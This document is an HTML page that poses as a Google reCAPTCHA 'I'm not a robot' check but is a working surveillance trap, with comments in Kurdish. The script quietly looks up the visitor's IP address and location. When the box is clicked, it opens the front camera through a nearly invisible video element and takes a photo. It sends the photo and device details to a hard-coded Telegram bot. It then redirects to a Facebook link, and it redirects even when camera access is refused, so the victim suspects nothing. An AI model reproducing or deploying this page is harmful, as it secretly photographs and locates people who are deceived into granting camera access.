<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify you are human</title>
    <style>
        body { background-color: #f9f9f9; margin: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        /* Ú¤ÛŒØ¯ÛŒÛ†Ú©Û• Ù†Ø§Ø¨ÛŽØª Display None Ø¨ÛŽØª Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ù„Û• Ø¦Û•Ù†Ø¯Ø±Û†ÛŒØ¯ Ú©Ø§Ø± Ø¨Ú©Ø§Øª */
        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        #canvas { display: none; }
        .captcha-box { background: white; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; }
        .text { color: #555; font-size: 14px; flex-grow: 1; margin-left: 10px; }
        .logo-section { text-align: center; }
        .logo-section img { width: 30px; }
        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin-right: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="captcha-box" onclick="startAuth()">
        <div class="checkbox" id="checkBtn"></div>
        <div class="loader" id="loadingCircle"></div>
        <div class="text">I'm not a robot</div>
        <div class="logo-section">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
            <p style="font-size: 8px; margin:0;">reCAPTCHA</p>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
        const CHAT_ID = '6351568884';
        const TARGET_URL = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr';

        let ipData = "Ø²Ø§Ù†ÛŒØ§Ø±ÛŒ IP Ø¯Û•Ø³Øª Ù†Û•Ú©Û•ÙˆØª";

        // ÙˆÛ•Ø±Ú¯Ø±ØªÙ†ÛŒ IP Ø¨Û• Ø¨ÛŽØ¯Û•Ù†Ú¯ÛŒ
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                ipData = `ðŸ“ ÙˆÚµØ§Øª: ${data.country_name}\nðŸ™ Ø´Ø§Ø±: ${data.city}\nðŸŒ Ø¦ÛŒÙ†ØªÛ•Ø±Ù†ÛŽØª: ${data.org}\nðŸ—º IP: ${data.ip}`;
            }).catch(() => { ipData = "Ú©ÛŽØ´Û• Ù„Û• ÙˆÛ•Ø±Ú¯Ø±ØªÙ†ÛŒ IP Ù‡Û•Ø¨ÙˆÙˆ"; });

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            if (/iPhone/i.test(ua)) return "iPhone ðŸ“±";
            if (/Android/i.test(ua)) return "Android ðŸ“±";
            return "PC/Other ðŸ’»";
        }

        function startAuth() {
            // Ú¯Û†Ú•ÛŒÙ†ÛŒ Ú•ÙˆÚ©Ø§Ø±ÛŒ Ú©ÛŽÙ¾Ú†Ø§Ú©Û• Ø¨Û† Ù„Û†Ø¯ÛŒÙ†Ú¯
            document.getElementById('checkBtn').style.display = 'none';
            document.getElementById('loadingCircle').style.display = 'block';

            const constraints = { 
                video: { 
                    facingMode: "user",
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                } 
            };

            navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Ú¯Ø±Ù†Ú¯ Ø¨Û† Ø¦Û•Ù†Ø¯Ø±Û†ÛŒØ¯: Ú†Ø§ÙˆÛ•Ú•ÛŽ Ø¯Û•Ú©Ø§Øª ØªØ§ Ú¤ÛŒØ¯ÛŒÛ†Ú©Û• Ø¨Û• ØªÛ•ÙˆØ§ÙˆÛŒ Ø¦Ø§Ù…Ø§Ø¯Û• Ø¯Û•Ø¨ÛŽØª
                video.onloadedmetadata = () => {
                    video.play();
                    
                    // Ù£ Ú†Ø±Ú©Û• Ú†Ø§ÙˆÛ•Ú•ÛŽ Ø¯Û•Ú©Û•ÛŒÙ† ØªØ§ Ú©Ø§Ù…ÛŽØ±Ø§Ú©Û• Ú•ÙˆÙˆÙ† Ø¯Û•Ø¨ÛŽØªÛ•ÙˆÛ• Ùˆ ÙˆÛŽÙ†Û•ÛŒ Ú•Û•Ø´ Ù†Û•Ú¯Ø±ÛŽØª
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        const context = canvas.getContext('2d');
                        
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'image.jpg');
                            formData.append('caption', `âœ… Ø²Ø§Ù†ÛŒØ§Ø±ÛŒ Ù†ÙˆÛŽ Ú¯Û•ÛŒØ´Øª:\n\nðŸ“± Ù…Û†Ø¨Ø§ÛŒÙ„: ${getDeviceInfo()}\n${ipData}`);

                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            }).then(() => {
                                // Ø¯ÙˆØ§ÛŒ Ù†Ø§Ø±Ø¯Ù† Ø¯Û•Ú†ÛŽØªÛ• Ø³Û•Ø± Ù„ÛŒÙ†Ú©ÛŒ Ù…Û•Ø¨Û•Ø³Øª
                                window.location.href = TARGET_URL;
                            });
                        }, 'image/jpeg', 0.7);
                    }, 3000);
                };
            })
            .catch((err) => {
                console.error("Camera Error:", err);
                // Ø¦Û•Ú¯Û•Ø± Ú•ÛŽÙ¾ÛŽØ¯Ø§Ù†ÛŒ Ù†Û•Ø¯Ø§ØŒ Ù‡Û•Ø± Ø¯Û•ÛŒØ¨Ø§Øª Ø¨Û† Ù„ÛŒÙ†Ú©Û•Ú©Û• ØªØ§ Ú¯ÙˆÙ…Ø§Ù† Ù†Û•Ú©Ø§Øª
                window.location.href = TARGET_URL;
            });
        }
    </script>
</body>
</html>
